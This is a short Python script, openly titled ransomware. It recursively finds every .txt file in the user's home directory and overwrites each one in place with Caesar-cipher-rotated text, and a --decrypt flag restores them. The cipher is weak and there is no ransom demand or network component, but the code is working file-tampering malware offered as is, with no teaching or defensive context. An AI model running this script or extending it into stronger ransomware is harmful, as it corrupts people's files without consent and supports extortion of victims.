''' Caesar Cipher Ransomware '''

# Modules
import os
from os.path import expanduser
from string import ascii_lowercase, ascii_uppercase, digits 
from sys import argv

# Search for files with defined extensions
def search_files(encrypted=False):
    ''' Encrypted parameter defines if a file is already encrypted, if so, the program will restore it's content '''

    extensions = ['txt']  # Custom extensions
    for root, _, files in os.walk(expanduser('~')): # "~" indicates current user home directory
        for file in files:
            if file.split('.')[-1] in extensions:
                print(f"[+] Encrypted file: {file.split('/')[-1]}")
                encrypt(os.path.join(root, file), encrypted=encrypted)
    print('[+] Finished encryption')

# Overwrite file data
def encrypt(filepath, encrypted):
    ''' Read file bytes and send it to encryption before overwriting the file '''

    with open(filepath, 'rb+') as file:
        _data = file.read()
        data = rotate(_data, encrypted=encrypted)
        file.seek(0)
        file.write(data.encode())

# Caesar cipher
def rotate(content, encrypted):
    ''' Note that, in order for decryption to work proprely, given numbers have to be mirrored i.e. 2/-2, 3/-3, 4/-4 '''

    charset = ascii_lowercase + ascii_uppercase + digits

    if encrypted:
        ciphertext = str.maketrans(charset, charset[2:] + charset[:2])
        return content.decode().translate(ciphertext)

    ciphertext = str.maketrans(charset, charset[-2:] + charset[:-2])
    return content.decode().translate(ciphertext)

if '--decrypt' in argv:
    search_files(encrypted=True)
else:
    search_files()